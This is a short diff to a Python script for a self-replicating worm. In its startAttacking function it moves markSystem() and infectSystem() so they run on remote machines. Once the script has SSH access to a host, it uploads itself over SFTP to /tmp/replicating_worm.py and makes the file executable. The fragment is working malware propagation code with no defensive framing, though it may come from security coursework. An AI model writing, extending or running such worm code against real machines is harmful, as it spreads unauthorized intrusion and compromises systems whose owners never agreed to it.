@@ -120,10 +120,7 @@ def startAttacking(wormLocation, isHost):
 
 	if isHost:
 		print network
-	else:
-		infectSystem()
-
-	markSystem()
+		markSystem()
 
 	currIp = getMachineIp()
 
@@ -135,7 +132,9 @@ def startAttacking(wormLocation, isHost):
 			print("SSH Info: %s" %(str(sshInfo)))
 		
 		if sshInfo and currIp != Host:
-
+			
+			markSystem()
+			infectSystem()
 			sftpClient = sshInfo[0].open_sftp()
 			sftpClient.put(wormLocation, "/tmp/" + "replicating_worm.py")
 			sshInfo[0].exec_command("chmod a+x /tmp/replicating_worm.py")
